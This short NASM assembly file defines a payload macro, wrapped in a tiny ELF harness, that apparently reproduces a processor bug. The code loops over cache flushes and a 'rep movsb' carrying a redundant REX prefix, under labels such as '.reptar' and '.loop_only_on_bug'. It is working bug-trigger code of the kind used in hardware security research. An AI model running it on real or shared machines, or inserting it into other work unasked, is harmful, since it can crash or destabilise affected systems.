%macro TINY_ELF_PAYLOAD 0
    _start:
        mov rdx, .end_of_program
        times 10 push rdx
        lea rax, [rsp - 0x1000]
        lea r8, [.after_reptar - .loop_only_on_bug]
        mov r10, 0x00007ffff7ffda40 ; after time
        mov r11, .loop_only_on_bug
        xor rdx, rdx
        xor rbx, rbx
        xor r12, r12
        mov r13, 0x13371337
        .loop_for_every_iteration:
            jmp r11
            .loop_only_on_bug:
                nop
                nop
                clflush [rax]
                clflush [rax+64]
                mov rsi, rax
                mov rdi, rax
                mov cl, 1
                inc rdx
                mov r9, rdx
                sub r9, r12
                imul r9, r8
                add r9, r11
                xor rbx, rbx
                cmp r9, r10
                setae bl
                imul rbx, 0x4000
                neg rbx
                add rbx, rsp
                nop
                mov qword [rbx], r13
                mov qword [rsp], r11

                .reptar:
                    rep
                    db 0x44; rex.r
                    movsb
                .after_reptar:
                    rep
                    times 4 nop
                    jmp .skip_reptar_alias

                .reptar_alias:
                    nop
                    nop
                    nop
                .after_reptar_alias:
                    times 100 nop
                    int3

                .skip_reptar_alias:
                    inc r12
                    jmp .loop_for_every_iteration
                .end_of_program:
                    int3
                    int3
%endmacro

%include "third_party/tiny_elf.asm"
